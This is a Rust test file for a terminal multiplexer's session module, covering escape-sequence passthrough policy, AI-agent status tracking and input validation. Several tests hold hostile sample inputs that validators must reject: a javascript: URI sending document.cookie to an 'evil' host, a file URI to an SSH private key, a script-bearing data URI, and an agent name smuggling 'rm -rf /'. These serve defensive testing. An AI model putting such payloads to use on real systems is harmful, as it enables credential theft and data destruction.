//! Tests for `session`.
use super::*;

use portable_pty::{ChildKiller, MasterPty, PtySize};

// ── PTY test doubles ───────────────────────────────────────────────────────
// Sessions need a master PTY and a child killer; these no-op doubles let a
// test feed synthetic PTY output through `feed_pty` without spawning a child.

#[derive(Debug)]
struct NullChildKiller;

impl ChildKiller for NullChildKiller {
    fn kill(&mut self) -> std::io::Result<()> {
        Ok(())
    }
    fn clone_killer(&self) -> Box<dyn ChildKiller + Send + Sync> {
        Box::new(Self)
    }
}

struct NullMasterPty;

impl MasterPty for NullMasterPty {
    fn resize(&self, _size: PtySize) -> Result<()> {
        Ok(())
    }
    fn get_size(&self) -> Result<PtySize> {
        Ok(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
    }
    fn try_clone_reader(&self) -> Result<Box<dyn std::io::Read + Send>> {
        Ok(Box::new(std::io::empty()))
    }
    fn take_writer(&self) -> Result<Box<dyn std::io::Write + Send>> {
        Ok(Box::new(std::io::sink()))
    }
    #[cfg(unix)]
    fn process_group_leader(&self) -> Option<nix::libc::pid_t> {
        None
    }
    #[cfg(unix)]
    fn as_raw_fd(&self) -> Option<portable_pty::unix::RawFd> {
        None
    }
    #[cfg(unix)]
    fn tty_name(&self) -> Option<std::path::PathBuf> {
        None
    }
}

fn test_session_with_policy(policy: OscPolicy) -> Session {
    let (input_tx, _input_rx) = mpsc::unbounded_channel();
    let mut session = Session::new_for_test(
        "Test".to_owned(),
        Some("codex".to_owned()),
        None,
        (24, 80),
        100,
        input_tx,
        Arc::new(Mutex::new(Box::new(NullMasterPty))),
        Arc::new(Mutex::new(Box::new(NullChildKiller))),
    );
    session.osc_policy = policy;
    session
}

/// Feed `bytes` through a default-policy session and return the
/// forwardable passthrough byte sequences (post-policy filter).
fn drained(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(bytes);
    session.drain_passthrough()
}

fn drained_with_policy(bytes: &[u8], policy: OscPolicy) -> Vec<Vec<u8>> {
    let mut session = test_session_with_policy(policy);
    session.feed_pty(bytes);
    session.drain_passthrough()
}

fn arbitrate_visible_session_for_test(
    session: &Session,
    registry: &crate::agent_status::rules::RulePackRegistry,
) -> crate::agent_status::arbitrate::ArbitrationResult {
    let visible_lines = session.visible_lines();
    let rule_match = registry.evaluate(session.agent.as_deref(), &visible_lines);
    let now = std::time::Instant::now();
    crate::agent_status::arbitrate::arbitrate(
        &crate::agent_status::evidence::EvidenceSnapshot {
            authority: None,
            osc: session.osc_evidence.clone(),
            screen: crate::agent_status::evidence::ScreenEvidence {
                state: rule_match.as_ref().and_then(|matched| matched.state),
                rule_id: rule_match.as_ref().map(|matched| matched.rule_id.clone()),
                strong: rule_match.as_ref().is_some_and(|matched| matched.strong),
                freeze: rule_match.as_ref().is_some_and(|matched| matched.freeze),
                observed_at: now,
            },
            process: crate::agent_status::evidence::ProcessEvidence {
                child_alive: true,
                foreground_is_agent: true,
                ..Default::default()
            },
            activity: crate::agent_status::evidence::ActivityEvidence {
                last_output: Some(session.last_output_at),
                last_input: Some(session.last_input_at),
            },
            subagents_active: 0,
        },
        session.status.raw,
        now,
    )
}

// ── OSC and unhandled-CSI passthrough contracts ───────────────────────────
// Every OSC the agent emits must reach the attached client when (and only
// when) the focused-pane policy allows it. The grid emits typed events; the
// session applies `OscPolicy` and re-encodes the forwardable bytes.

#[test]
fn osc_52_clipboard_write_is_re_emitted() {
    let drained = drained(b"\x1b]52;c;SGVsbG8=\x07");
    assert_eq!(drained.len(), 1);
    let s = &drained[0];
    assert!(s.starts_with(b"\x1b]52;"));
    assert!(s.windows(8).any(|w| w == b"SGVsbG8="));
}

#[test]
fn osc_2_window_title_is_re_emitted_and_captured() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]2;Claude (working)\x07");
    assert_eq!(
        session.title(),
        Some("Claude (working)"),
        "title not captured"
    );
    let drained = session.drain_passthrough();
    assert_eq!(drained.len(), 1);
    assert!(drained[0].starts_with(b"\x1b]0;") || drained[0].starts_with(b"\x1b]2;"));
}

#[test]
fn retained_status_osc_title_is_capped_without_truncating_pane_title() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let long_title = "x".repeat(300);
    session.feed_pty(format!("\x1b]2;{long_title}\x07").as_bytes());

    assert_eq!(session.title(), Some(long_title.as_str()));
    assert_eq!(
        session
            .osc_evidence
            .title
            .as_ref()
            .expect("status title evidence should be retained")
            .len(),
        256
    );
}

#[test]
fn osc_8_hyperlink_is_re_emitted() {
    let drained = drained(b"\x1b]8;;https://example/\x07text\x1b]8;;\x07");
    assert!(
        drained
            .iter()
            .any(|f| f.windows(b"https".len()).any(|w| w == b"https")),
        "expected the http hyperlink to round-trip: {drained:?}"
    );
}

#[test]
fn osc_9_notification_is_re_emitted() {
    let drained = drained(b"\x1b]9;build finished\x07");
    assert_eq!(drained.len(), 1);
    let s = String::from_utf8_lossy(&drained[0]);
    assert!(s.contains("9;build finished"));
}

#[test]
fn bel_is_re_emitted_and_captured_as_status_evidence() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x07\x07");

    assert!(session.osc_evidence.bel_at.is_some());
    assert_eq!(session.osc_evidence.bel_count, 2);
    assert_eq!(
        session.drain_passthrough(),
        vec![b"\x07".to_vec(), b"\x07".to_vec()]
    );
}

#[test]
fn osc_9_4_progress_is_re_emitted_and_captured() {
    let mut session = test_session_with_policy(OscPolicy::default());

    session.feed_pty(b"\x1b]9;4;3\x07");
    assert!(session.osc_evidence.progress_active);
    let drained = session.drain_passthrough();
    assert_eq!(drained, vec![b"\x1b]9;4;3\x07".to_vec()]);

    session.feed_pty(b"\x1b]9;4;0\x07");
    assert!(!session.osc_evidence.progress_active);
    assert!(session.osc_evidence.progress_cleared_at.is_some());
}

#[test]
fn shell_osc133_marks_update_status_evidence() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.agent = None;

    session.feed_pty(b"\x1b]133;C\x07");
    assert_eq!(
        session.osc_evidence.shell_state,
        Some(crate::agent_status::evidence::RawAgentState::Working)
    );

    session.feed_pty(b"\x1b]133;B\x07");
    assert_eq!(
        session.osc_evidence.shell_state,
        Some(crate::agent_status::evidence::RawAgentState::Idle)
    );
}

#[test]
fn osc_7_cwd_is_captured_and_percent_decoded() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]7;file://localhost/Users/alice/My%20Code\x07");
    assert_eq!(
        session.cwd(),
        Some("/Users/alice/My Code"),
        "OSC 7 must percent-decode and strip the host"
    );
    // OSC 7 must NEVER be forwarded to the outer terminal.
    assert!(
        session.drain_passthrough().is_empty(),
        "OSC 7 must not reach the outer terminal"
    );
}

#[test]
fn osc_7_rejects_malformed_payload() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]7;random-text\x07");
    assert!(session.cwd().is_none());
}

#[test]
fn kitty_kb_stack_tracks_push_and_pop() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b[>1u\x1b[>3u");
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 3);
    session.feed_pty(b"\x1b[<1u");
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 1);
    session.feed_pty(b"\x1b[<5u"); // over-pop bounded by stack length
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 0);
}

#[test]
fn focus_events_flag_tracks_dec_1004() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b[?1004h");
    assert!(session.focus_events_enabled());
    session.feed_pty(b"\x1b[?1004l");
    assert!(!session.focus_events_enabled());
}

#[test]
fn title_and_cwd_changes_mark_pane_chrome_dirty() {
    let mut session = test_session_with_policy(OscPolicy::default());
    assert!(!session.pane_chrome_dirty());

    session.feed_pty(b"\x1b]2;prompt title\x07");
    assert!(session.pane_chrome_dirty());

    session.clear_pane_chrome_dirty();
    assert!(!session.pane_chrome_dirty());
    session.feed_pty(b"\x1b]7;file:///workspace/project\x07");
    assert!(session.pane_chrome_dirty());
}

#[test]
fn unhandled_csi_kitty_keyboard_push_is_forwarded() {
    // The grid emits the canonical push bytes; the session forwards them
    // verbatim while tracking the stack for focus-swap restore.
    let drained = drained(b"\x1b[>1u");
    assert!(
        drained.iter().any(|f| f == b"\x1b[>1u"),
        "kitty push must reach the outer terminal: {drained:?}"
    );
}

#[test]
fn unhandled_csi_xterm_window_reports_are_suppressed() {
    // `CSI ... t` is xterm's window manipulation / reporting family;
    // forwarding it lets the host terminal's reply land in a shell pane.
    let drained = drained(b"\x1b[18t\x1b[14t\x1b[16t\x1b[8;40;135t");
    assert!(
        drained.iter().all(|f| !f.ends_with(b"t")),
        "xterm window reports must not reach the outer terminal: {drained:?}"
    );
}

#[test]
fn unhandled_csi_modify_other_keys_is_re_emitted() {
    let drained = drained(b"\x1b[>4;2m");
    assert!(
        drained.iter().any(|f| f == b"\x1b[>4;2m"),
        "drained: {drained:?}"
    );
}

#[test]
fn unhandled_csi_bsu_esu_is_forwarded() {
    let drained = drained(b"\x1b[?2026h");
    assert!(
        drained.iter().any(|f| f == b"\x1b[?2026h"),
        "?2026h must reach the outer terminal: {drained:?}"
    );
}

#[test]
fn known_csi_does_not_double_emit() {
    // Cursor positioning `\x1b[5;3H` is handled by the grid; it must not be
    // re-emitted as passthrough (which would duplicate the cursor move).
    let drained = drained(b"\x1b[5;3H");
    assert!(
        drained.iter().all(|f| !f.ends_with(b"H")),
        "grid-handled CSI leaked through: {drained:?}"
    );
}

#[test]
fn drain_returns_empty_when_no_passthrough_emitted() {
    let drained = drained(b"plain text without any escape sequences");
    assert!(drained.is_empty());
}

#[test]
fn pty_output_does_not_change_agent_state() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.status.publish_raw(
        crate::agent_status::evidence::RawAgentState::Blocked,
        jackin_protocol::agent_status::AgentStatusConfidence::Strong,
        crate::agent_status::evidence::EvidenceSummary::default(),
    );
    session.state = session.status.effective;
    assert_eq!(session.state(), AgentState::Blocked);

    let before_output = session.last_output_at;
    session.feed_pty(b"redraw from a blocked approval dialog\r\n");

    assert_eq!(session.state(), AgentState::Blocked);
    assert!(session.last_output_at >= before_output);
}

#[test]
fn blocked_dialog_redraw_soak_publishes_one_transition() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.agent = Some("claude".to_owned());
    let registry = crate::agent_status::rules::RulePackRegistry::bundled().unwrap();
    let dialog = include_str!("../agent_status/screen/fixtures/claude/blocked.txt");
    let mut transition_count = 0;

    for _ in 0..150 {
        let frame = format!("\x1b[2J\x1b[H{dialog}");
        session.feed_pty(frame.as_bytes());
        let result = arbitrate_visible_session_for_test(&session, &registry);

        if crate::agent_status::policy::should_publish_candidate(
            session.status.effective,
            &result,
            &mut session.pending_status_transition,
        ) {
            if session
                .status
                .publish_raw(result.raw, result.confidence, result.summary)
                .is_some()
            {
                transition_count += 1;
            }
            session.state = session.status.effective;
        }
    }

    assert_eq!(transition_count, 1);
    assert_eq!(session.state(), AgentState::Blocked);
}

#[test]
fn recorded_pty_transcripts_replay_through_parser_and_engine() {
    let cases = [(
        "claude",
        include_bytes!("../agent_status/screen/transcripts/claude/blocked.ansi").as_slice(),
        crate::agent_status::evidence::RawAgentState::Blocked,
        "permission-dialog",
    )];
    let registry = crate::agent_status::rules::RulePackRegistry::bundled().unwrap();

    for (agent, transcript, expected_state, expected_rule) in cases {
        let mut session = test_session_with_policy(OscPolicy::default());
        session.agent = Some(agent.to_owned());
        session.feed_pty(transcript);

        let result = arbitrate_visible_session_for_test(&session, &registry);

        assert_eq!(result.raw, expected_state, "transcript for {agent}");
        assert_eq!(result.summary.rule_id.as_deref(), Some(expected_rule));
        assert!(result.summary.visible_blocker);
    }
}

#[test]
fn operator_input_does_not_change_agent_state() {
    let mut blocked = test_session_with_policy(OscPolicy::default());
    blocked.status.publish_raw(
        crate::agent_status::evidence::RawAgentState::Blocked,
        jackin_protocol::agent_status::AgentStatusConfidence::Strong,
        crate::agent_status::evidence::EvidenceSummary::default(),
    );
    blocked.state = blocked.status.effective;
    assert_eq!(blocked.state(), AgentState::Blocked);

    let before_input = blocked.last_input_at;
    assert!(blocked.mark_operator_input());

    assert_eq!(blocked.state(), AgentState::Blocked);
    assert!(blocked.last_input_at >= before_input);

    let mut done = test_session_with_policy(OscPolicy::default());
    done.status.publish_raw(
        crate::agent_status::evidence::RawAgentState::Working,
        jackin_protocol::agent_status::AgentStatusConfidence::Strong,
        crate::agent_status::evidence::EvidenceSummary::default(),
    );
    done.status.publish_raw(
        crate::agent_status::evidence::RawAgentState::Idle,
        jackin_protocol::agent_status::AgentStatusConfidence::Strong,
        crate::agent_status::evidence::EvidenceSummary::default(),
    );
    done.state = done.status.effective;
    assert_eq!(done.state(), AgentState::Done);

    assert!(!done.mark_operator_input());

    assert_eq!(done.state(), AgentState::Done);
}

#[test]
fn osc_52_clipboard_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]52;c;SGVsbG8=\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 52 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_9_notification_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]9;build finished\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 9 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn bel_evidence_is_retained_when_notify_policy_denies_forwarding() {
    let mut session = test_session_with_policy(OscPolicy::for_test_deny_all());
    session.feed_pty(b"\x07");

    assert!(session.osc_evidence.bel_at.is_some());
    assert_eq!(session.osc_evidence.bel_count, 1);
    assert!(session.drain_passthrough().is_empty());
}

#[test]
fn osc_2_title_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]2;rogue title\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 2 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_8_hyperlink_dropped_when_policy_denies() {
    let drained = drained_with_policy(
        b"\x1b]8;;https://example/\x07text\x1b]8;;\x07",
        OscPolicy::for_test_deny_all(),
    );
    assert!(
        drained.is_empty(),
        "OSC 8 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_8_unsafe_scheme_dropped_even_when_policy_allows() {
    // A `javascript:` URI must never reach the host terminal regardless of
    // the operator's hyperlink policy.
    let drained = drained(b"\x1b]8;;javascript:alert(1)\x07");
    assert!(
        drained
            .iter()
            .all(|f| !f.windows(b"javascript".len()).any(|w| w == b"javascript")),
        "unsafe OSC 8 scheme leaked: {drained:?}"
    );
}

#[test]
fn drain_clears_pending_between_calls() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]52;c;AAAA\x07");
    let first = session.drain_passthrough();
    assert_eq!(first.len(), 1);
    let second = session.drain_passthrough();
    assert!(
        second.is_empty(),
        "drain must clear pending; got {second:?}"
    );
}

#[test]
fn focus_swap_reset_covers_every_mode_current_mode_state_may_emit() {
    // Symmetry contract: every mode that `current_mode_state` can
    // set on the outer terminal during focus-in must have a
    // matching off-toggle in `focus_swap_reset`, otherwise the
    // previous pane's mode silently leaks into the new pane.
    //
    // `current_mode_state` can emit:
    //   - `\x1b[?2004h` (bracketed paste)   → reset `?2004l`
    //   - `\x1b[?1h`    (application cursor) → reset `?1l`
    //   - `\x1b[>{n}u`  (kitty kb push)     → reset `\x1b[<u` (pop)
    //   - `\x1b[?25h/l` (cursor visibility) → intentionally NOT in
    //                                         reset; `current_mode_state`
    //                                         unconditionally re-asserts.
    let reset = Session::focus_swap_reset();
    for needle in [&b"\x1b[?2004l"[..], &b"\x1b[?1l"[..], &b"\x1b[<u"[..]] {
        assert!(
            reset.windows(needle.len()).any(|w| w == needle),
            "focus_swap_reset missing {needle:?}; got {reset:?}"
        );
    }
}

#[test]
fn focus_swap_reset_leaves_client_owned_modes_alone() {
    // The attach client owns mouse reporting, focus reporting,
    // alt-screen, and alternate-scroll suppression. The reset must
    // not touch them; clobbering them here drops the multiplexer's
    // ability to receive tab clicks, drag-resize, FocusIn/FocusOut,
    // or wheel mouse events for the remainder of the session.
    let reset = Session::focus_swap_reset();
    for forbidden in [
        &b"\x1b[?1000l"[..],
        &b"\x1b[?1002l"[..],
        &b"\x1b[?1003l"[..],
        &b"\x1b[?1006l"[..],
        &b"\x1b[?1007l"[..],
        &b"\x1b[?1004l"[..],
        &b"\x1b[?1049l"[..],
        &b"\x1b[?25l"[..],
        &b"\x1b[?25h"[..],
    ] {
        assert!(
            !reset.windows(forbidden.len()).any(|w| w == forbidden),
            "focus_swap_reset must not toggle {forbidden:?}"
        );
    }
}

#[test]
fn build_agent_command_overrides_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_owned(), "claude".to_owned())];
    let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("JACKIN_AGENT").and_then(|value| value.to_str()),
        Some("codex")
    );
}

#[test]
fn build_agent_command_uses_stable_pane_term() {
    let env = vec![("TERM".to_owned(), "xterm-ghostty".to_owned())];
    let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("TERM").and_then(|value| value.to_str()),
        Some("xterm-256color")
    );
}

#[test]
fn build_agent_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_owned(), "24bit".to_owned())];
    let cmd = build_agent_command("claude", None, &env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn build_shell_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_owned(), "false".to_owned())];
    let cmd = build_shell_command(&env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn agent_model_args_match_cli_contracts() {
    assert_eq!(
        agent_model_args("claude", Some("sonnet")),
        vec!["--model", "sonnet"]
    );
    assert_eq!(
        agent_model_args("codex", Some("gpt-5")),
        vec!["-m", "gpt-5"]
    );
    assert_eq!(
        agent_model_args("kimi", Some("kimi-k2")),
        vec!["--model", "kimi-k2"]
    );
    assert_eq!(
        agent_model_args("opencode", Some("zai/glm")),
        vec!["-m", "zai/glm"]
    );
    assert_eq!(
        agent_model_args("grok", Some("grok-build-0.1")),
        vec!["-m", "grok-build-0.1"]
    );
    assert!(agent_model_args("amp", None).is_empty());
    assert!(agent_model_args("amp", Some("ignored")).is_empty());
}

#[test]
fn build_shell_command_removes_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_owned(), "claude".to_owned())];
    let cmd = build_shell_command(&env, Path::new("/workspace"), "test");

    assert!(cmd.get_env("JACKIN_AGENT").is_none());
}

#[test]
fn osc8_uri_empty_is_safe() {
    // Empty URI = link terminator; must always pass.
    assert!(osc8_uri_is_safe(""));
}

#[test]
fn osc8_uri_http_https_mailto_pass() {
    assert!(osc8_uri_is_safe("http://example.com"));
    assert!(osc8_uri_is_safe("https://example.com"));
    assert!(osc8_uri_is_safe("HTTPS://EXAMPLE.COM"));
    assert!(osc8_uri_is_safe("mailto:foo@example.com"));
}

#[test]
fn osc8_uri_unsafe_schemes_rejected() {
    // The threat scenarios the allowlist is here to block.
    assert!(!osc8_uri_is_safe(
        "javascript:fetch('//evil/?'+document.cookie)"
    ));
    assert!(!osc8_uri_is_safe("file:///Users/operator/.ssh/id_rsa"));
    assert!(!osc8_uri_is_safe(
        "data:text/html,<script>alert(1)</script>"
    ));
    assert!(!osc8_uri_is_safe("ssh://server"));
}

#[test]
fn validate_agent_slug_rejects_typical_attacks() {
    let supported = Vec::new();
    assert!(validate_agent_slug("", &supported).is_err());
    assert!(validate_agent_slug("--debug", &supported).is_err());
    assert!(validate_agent_slug("claude\n; rm -rf /", &supported).is_err());
    assert!(validate_agent_slug("claude codex", &supported).is_err());
    assert!(validate_agent_slug("claude\0", &supported).is_err());
}

#[test]
fn validate_agent_slug_accepts_well_formed_slug_when_no_allowlist() {
    let supported = Vec::new();
    assert!(validate_agent_slug("claude", &supported).is_ok());
    assert!(validate_agent_slug("codex", &supported).is_ok());
}

#[test]
fn validate_agent_slug_rejects_slug_outside_launch_config_allowlist() {
    let supported = vec!["claude".to_owned()];
    assert!(validate_agent_slug("claude", &supported).is_ok());
    assert_eq!(
        validate_agent_slug("codex", &supported).unwrap_err(),
        "not in launch config allowlist"
    );
}
